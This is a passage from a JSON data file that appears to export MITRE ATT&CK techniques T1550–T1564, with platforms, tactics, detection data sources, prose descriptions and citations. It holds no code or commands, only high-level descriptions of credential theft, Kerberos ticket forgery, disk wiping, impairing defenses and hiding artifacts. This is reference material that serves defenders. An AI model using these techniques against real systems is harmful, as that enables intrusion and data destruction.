omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "NIST Authentication",
        "url": "https://csrc.nist.gov/glossary/term/authentication",
        "description": "NIST. (n.d.). Authentication. Retrieved January 30, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "NIST MFA",
        "url": "https://csrc.nist.gov/glossary/term/Multi_Factor-Authentication",
        "description": "NIST. (n.d.). Multi-Factor Authentication (MFA). Retrieved January 30, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Audit Policy",
        "url": "https://technet.microsoft.com/en-us/library/dn487457.aspx",
        "description": "Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
    "platform": "windows|office-365|saas",
    "tid": "T1550",
    "technique": "Use Alternate Authentication Material",
    "tactic": "lateral-movement",
    "datasources": "authentication-logs|oauth-audit-logs|office-365-audit-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1550.001",
      "T1550.002",
      "T1550.003",
      "T1550.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. <!-- raw HTML omitted --><!-- raw HTML omitted -->Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)<!-- raw HTML omitted --><!-- raw HTML omitted -->Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through <a href=\"https://attack.mitre.org/tactics/TA0006\">Credential Access</a> techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "NIST Authentication",
        "url": "https://csrc.nist.gov/glossary/term/authentication",
        "description": "NIST. (n.d.). Authentication. Retrieved January 30, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "NIST MFA",
        "url": "https://csrc.nist.gov/glossary/term/Multi_Factor-Authentication",
        "description": "NIST. (n.d.). Multi-Factor Authentication (MFA). Retrieved January 30, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Audit Policy",
        "url": "https://technet.microsoft.com/en-us/library/dn487457.aspx",
        "description": "Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517",
    "platform": "linux|macos|windows|aws|gcp|azure|office-365|azure-ad|saas",
    "tid": "T1552",
    "technique": "Unsecured Credentials",
    "tactic": "credential-access",
    "datasources": "authentication-logs|aws-cloudtrail-logs|azure-activity-logs|file-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs|windows-registry",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1552.001",
      "T1552.002",
      "T1552.003",
      "T1552.004",
      "T1552.005",
      "T1552.006"
    ],
    "count_subtechniques": 6,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. <a href=\"https://attack.mitre.org/techniques/T1552/003\">Bash History</a>), operating system or application-specific repositories (e.g. <a href=\"https://attack.mitre.org/techniques/T1552/002\">Credentials in Registry</a>), or other specialized files/artifacts (e.g. <a href=\"https://attack.mitre.org/techniques/T1552/004\">Private Keys</a>).</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7",
    "platform": "windows|macos|linux",
    "tid": "T1553",
    "technique": "Subvert Trust Controls",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|application-logs|binary-file-metadata|dll-monitoring|file-monitoring|loaded-dlls|process-command-line-parameters|process-monitoring|windows-event-logs|windows-registry",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1553.001",
      "T1553.002",
      "T1553.003",
      "T1553.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct <a href=\"https://attack.mitre.org/techniques/T1222\">File and Directory Permissions Modification</a> or <a href=\"https://attack.mitre.org/techniques/T1112\">Modify Registry</a> in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates)</p>\n",
    "technique_references": [
      {
        "source_name": "SpectorOps Subverting Trust Sept 2017",
        "url": "https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf",
        "description": "Graeber, M. (2017, September). Subverting Trust in Windows. Retrieved January 31, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Securelist Digital Certificates",
        "url": "https://securelist.com/why-you-shouldnt-completely-trust-files-signed-with-digital-certificates/68593/",
        "description": "Ladikov, A. (2015, January 29). Why You Shouldn’t Completely Trust Files Signed with Digital Certificates. Retrieved March 31, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Symantec Digital Certificates",
        "url": "http://www.symantec.com/connect/blogs/how-attackers-steal-private-keys-digital-certificates",
        "description": "Shinotsuka, H. (2013, February 22). How Attackers Steal Private Keys from Digital Certificates. Retrieved March 31, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "SpectorOps Code Signing Dec 2017",
        "url": "https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec",
        "description": "Graeber, M. (2017, December 22). Code Signing Certificate Cloning Attacks and Defenses. Retrieved April 3, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--960c3c86-1480-4d72-b4e0-8c242e84a5c5",
    "platform": "linux|macos|windows",
    "tid": "T1554",
    "technique": "Compromise Client Software Binary",
    "tactic": "persistence",
    "datasources": "binary-file-metadata|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify client software binaries to establish persistent access to systems. Client software enables users to access services provided by a server. Common client software types are SSH clients, FTP clients, email clients, and web browsers.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use. For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary (or support files) with the backdoored one. Since these applications may be routinely executed by the user, the adversary can leverage this for persistent access to the host.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0",
    "platform": "linux|macos|windows",
    "tid": "T1555",
    "technique": "Credentials from Password Stores",
    "tactic": "credential-access",
    "datasources": "api-monitoring|file-monitoring|powershell-logs|process-monitoring|system-calls",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1555.001",
      "T1555.002",
      "T1555.003"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--f4c1826f-a322-41cd-9557-562100848c84",
    "platform": "windows|linux|macos|network",
    "tid": "T1556",
    "technique": "Modify Authentication Process",
    "tactic": "credential-access",
    "datasources": "api-monitoring|authentication-logs|dll-monitoring|file-monitoring|process-monitoring|windows-registry",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1556.001",
      "T1556.002",
      "T1556.003",
      "T1556.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows or pluggable authentication modules (PAM) on Unix-based systems, responsible for gathering, storing, and validating credentials. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.</p>\n",
    "technique_references": [
      {
        "source_name": "Clymb3r Function Hook Passwords Sept 2013",
        "url": "https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/",
        "description": "Bialek, J. (2013, September 15). Intercepting Password Changes With Function Hooking. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Dell Skeleton",
        "url": "https://www.secureworks.com/research/skeleton-key-malware-analysis",
        "description": "Dell SecureWorks. (2015, January 12). Skeleton Key Malware Analysis. Retrieved April 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Audit Policy",
        "url": "https://technet.microsoft.com/en-us/library/dn487457.aspx",
        "description": "Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f4c1826f-a322-41cd-9557-562100848c84",
    "platform": "windows|linux|macos|network",
    "tid": "T1556",
    "technique": "Modify Authentication Process",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|authentication-logs|dll-monitoring|file-monitoring|process-monitoring|windows-registry",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1556.001",
      "T1556.002",
      "T1556.003",
      "T1556.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows or pluggable authentication modules (PAM) on Unix-based systems, responsible for gathering, storing, and validating credentials. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.</p>\n",
    "technique_references": [
      {
        "source_name": "Clymb3r Function Hook Passwords Sept 2013",
        "url": "https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/",
        "description": "Bialek, J. (2013, September 15). Intercepting Password Changes With Function Hooking. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Dell Skeleton",
        "url": "https://www.secureworks.com/research/skeleton-key-malware-analysis",
        "description": "Dell SecureWorks. (2015, January 12). Skeleton Key Malware Analysis. Retrieved April 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Audit Policy",
        "url": "https://technet.microsoft.com/en-us/library/dn487457.aspx",
        "description": "Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
    "platform": "windows|macos|linux",
    "tid": "T1557",
    "technique": "Man-in-the-Middle",
    "tactic": "credential-access",
    "datasources": "file-monitoring|netflow-enclave-netflow|packet-capture",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1557.001",
      "T1557.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to position themselves between two or more networked devices using a man-in-the-middle (MiTM) technique to support follow-on behaviors such as <a href=\"https://attack.mitre.org/techniques/T1040\">Network Sniffing</a> or <a href=\"https://attack.mitre.org/techniques/T1565/002\">Transmitted Data Manipulation</a>. By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may leverage the MiTM position to attempt to modify traffic, such as in <a href=\"https://attack.mitre.org/techniques/T1565/002\">Transmitted Data Manipulation</a>. Adversaries can also stop traffic from flowing to the appropriate destination, causing denial of service.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/94.html",
        "description": "none",
        "external_id": "CAPEC-94"
      },
      {
        "source_name": "Rapid7 MiTM Basics",
        "url": "https://www.rapid7.com/fundamentals/man-in-the-middle-attacks/",
        "description": "Rapid7. (n.d.). Man-in-the-Middle (MITM) Attacks. Retrieved March 2, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
    "platform": "windows|macos|linux",
    "tid": "T1557",
    "technique": "Man-in-the-Middle",
    "tactic": "collection",
    "datasources": "file-monitoring|netflow-enclave-netflow|packet-capture",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1557.001",
      "T1557.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to position themselves between two or more networked devices using a man-in-the-middle (MiTM) technique to support follow-on behaviors such as <a href=\"https://attack.mitre.org/techniques/T1040\">Network Sniffing</a> or <a href=\"https://attack.mitre.org/techniques/T1565/002\">Transmitted Data Manipulation</a>. By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may leverage the MiTM position to attempt to modify traffic, such as in <a href=\"https://attack.mitre.org/techniques/T1565/002\">Transmitted Data Manipulation</a>. Adversaries can also stop traffic from flowing to the appropriate destination, causing denial of service.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/94.html",
        "description": "none",
        "external_id": "CAPEC-94"
      },
      {
        "source_name": "Rapid7 MiTM Basics",
        "url": "https://www.rapid7.com/fundamentals/man-in-the-middle-attacks/",
        "description": "Rapid7. (n.d.). Man-in-the-Middle (MITM) Attacks. Retrieved March 2, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--3fc01293-ef5e-41c6-86ce-61f10706b64a",
    "platform": "windows",
    "tid": "T1558",
    "technique": "Steal or Forge Kerberos Tickets",
    "tactic": "credential-access",
    "datasources": "authentication-logs|windows-event-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1558.001",
      "T1558.002",
      "T1558.003",
      "T1558.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable <a href=\"https://attack.mitre.org/techniques/T1550/003\">Pass the Ticket</a>. <!-- raw HTML omitted --><!-- raw HTML omitted -->Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Attackers may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/652.html",
        "description": "none",
        "external_id": "CAPEC-652"
      },
      {
        "source_name": "ADSecurity Kerberos Ring Decoder",
        "url": "https://adsecurity.org/?p=227",
        "description": "Sean Metcalf. (2014, September 12). Kerberos, Active Directory’s Secret Decoder Ring. Retrieved February 27, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ADSecurity Detecting Forged Tickets",
        "url": "https://adsecurity.org/?p=1515",
        "description": "Metcalf, S. (2015, May 03). Detecting Forged Kerberos Ticket (Golden Ticket & Silver Ticket) Use in Active Directory. Retrieved December 23, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "Stealthbits Detect PtT 2019",
        "url": "https://blog.stealthbits.com/detect-pass-the-ticket-attacks",
        "description": "Jeff Warren. (2019, February 19). How to Detect Pass-the-Ticket Attacks. Retrieved February 27, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "CERT-EU Golden Ticket Protection",
        "url": "https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf",
        "description": "Abolins, D., Boldea, C., Socha, K., Soria-Machado, M. (2016, April 26). Kerberos Golden Ticket Protection. Retrieved July 13, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Kerberos Golden Ticket",
        "url": "https://gallery.technet.microsoft.com/scriptcenter/Kerberos-Golden-Ticket-b4814285",
        "description": "Microsoft. (2015, March 24). Kerberos Golden Ticket Check (Updated). Retrieved February 27, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Detecting Kerberoasting Feb 2018",
        "url": "https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/",
        "description": "Bani, M. (2018, February 23). Detecting Kerberoasting activity using Azure Security Center. Retrieved March 23, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "AdSecurity Cracking Kerberos Dec 2015",
        "url": "https://adsecurity.org/?p=2293",
        "description": "Metcalf, S. (2015, December 31). Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain. Retrieved March 22, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Medium Detecting Attempts to Steal Passwords from Memory",
        "url": "https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea",
        "description": "French, D. (2018, October 2). Detecting Attempts to Steal Passwords from Memory. Retrieved October 11, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--acd0ba37-7ba9-4cc5-ac61-796586cd856d",
    "platform": "windows",
    "tid": "T1559",
    "technique": "Inter-Process Communication",
    "tactic": "execution",
    "datasources": "dll-monitoring|file-monitoring|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1559.001",
      "T1559.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows <a href=\"https://attack.mitre.org/techniques/T1559/002\">Dynamic Data Exchange</a> or <a href=\"https://attack.mitre.org/techniques/T1559/001\">Component Object Model</a>. Higher level execution mediums, such as those of <a href=\"https://attack.mitre.org/techniques/T1059\">Command and Scripting Interpreter</a>s, may also leverage underlying IPC mechanisms.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a",
    "platform": "linux|macos|windows",
    "tid": "T1560",
    "technique": "Archive Collected Data",
    "tactic": "collection",
    "datasources": "binary-file-metadata|file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1560.001",
      "T1560.002",
      "T1560.003"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.<!-- raw HTML omitted --><!-- raw HTML omitted -->Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia File Header Signatures",
        "url": "https://en.wikipedia.org/wiki/List_of_file_signatures",
        "description": "Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1988cc35-ced8-4dad-b2d1-7628488fa967",
    "platform": "linux|macos|windows",
    "tid": "T1561",
    "technique": "Disk Wipe",
    "tactic": "impact",
    "datasources": "kernel-drivers|process-command-line-parameters|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1561.001",
      "T1561.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.<!-- raw HTML omitted --><!-- raw HTML omitted -->To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a>, <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a>, and <a href=\"https://attack.mitre.org/techniques/T1021/002\">SMB/Windows Admin Shares</a>.(Citation: Novetta Blockbuster Destructive Malware)</p>\n",
    "technique_references": [
      {
        "source_name": "Novetta Blockbuster Destructive Malware",
        "url": "https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf",
        "description": "Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Destructive Malware Report. Retrieved March 2, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Sysmon v6 May 2017",
        "url": "https://docs.microsoft.com/sysinternals/downloads/sysmon",
        "description": "Russinovich, M. & Garnier, T. (2017, May 22). Sysmon v6.20. Retrieved December 13, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--3d333250-30e4-4a82-9edc-756c68afc529",
    "platform": "linux|windows|macos|aws|gcp|azure",
    "tid": "T1562",
    "technique": "Impair Defenses",
    "tactic": "defense-evasion",
    "datasources": "anti-virus|api-monitoring|authentication-logs|aws-cloudtrail-logs|azure-activity-logs|environment-variable|file-monitoring|gcp-audit-logs|process-command-line-parameters|process-monitoring|services|windows-registry",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1562.001",
      "T1562.002",
      "T1562.003",
      "T1562.004",
      "T1562.006",
      "T1562.007",
      "T1562.008"
    ],
    "count_subtechniques": 7,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--5b0ad6f8-6a16-4966-a4ef-d09ea6e2a9f5",
    "platform": "linux|macos|windows",
    "tid": "T1563",
    "technique": "Remote Service Session Hijacking",
    "tactic": "lateral-movement",
    "datasources": "authentication-logs|netflow-enclave-netflow|process-command-line-parameters|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1563.001",
      "T1563.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may commandeer these sessions to carry out actions on remote systems. <a href=\"https://attack.mitre.org/techniques/T1563\">Remote Service Session Hijacking</a> differs from use of <a href=\"https://attack.mitre.org/techniques/T1021\">Remote Services</a> because it hijacks an existing session rather than creating a new session using <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a>.(Citation: RDP Hijacking Medium)(Citation: Breach Post-mortem SSH Hijack)</p>\n",
    "technique_references": [
      {
        "source_name": "RDP Hijacking Medium",
        "url": "https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6",
        "description": "Beaumont, K. (2017, March 19). RDP hijacking — how to hijack RDS and RemoteApp sessions transparently to move through an organisation. Retrieved December 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Breach Post-mortem SSH Hijack",
        "url": "https://matrix.org/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident",
        "description": "Hodgson, M. (2019, May 8). Post-mortem and remediations for Apr 11 security incident. Retrieved February 17, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8",
    "platform": "linux|macos|windows",
    "tid": "T1564",
    "technique": "Hide Artifacts",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|authentication-logs|file-monitoring|powershell-logs|process-command-line-parameters|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1564.001",
      "T1564.002",
      "T1564.003",
      "T1564.004",
      "T1564.005",
      "T1564.006",
      "T1564.007"
    ],
    "count_subtechniques": 7,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)</p>\n",
    "technique_references": [
      {
        "source_name": "Sofacy Komplex Trojan",
        "url": "https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/",
        "description": "Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy's 'Komplex' OS X Trojan. Retrieved July 8, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Cybereason OSX Pirrit",
        "url": "http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-OSX-Pirrit-4-6-16.pdf",
        "description": "Amit Serper. (2016). Cybereason Lab Analysis OSX.Pirrit. Retrieved July 31, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "MalwareBytes ADS July 2015",
        "url": "https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/",
        "description": "Arntz, P. (2015, July 22). Introduction to Alternate Data Streams. Retrieved March 21, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Sophos Ragnar May 2020",
        "url": "https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/",
